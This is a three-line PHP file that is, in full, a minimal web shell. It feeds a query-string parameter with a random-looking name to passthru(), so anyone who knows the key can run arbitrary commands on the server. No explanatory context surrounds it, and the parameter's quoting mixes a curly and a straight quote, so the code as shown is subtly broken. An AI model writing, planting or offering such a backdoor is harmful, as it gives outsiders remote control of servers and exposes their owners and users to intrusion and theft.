<?php
passthru($_GET[’e3qE5rOH']);
?>
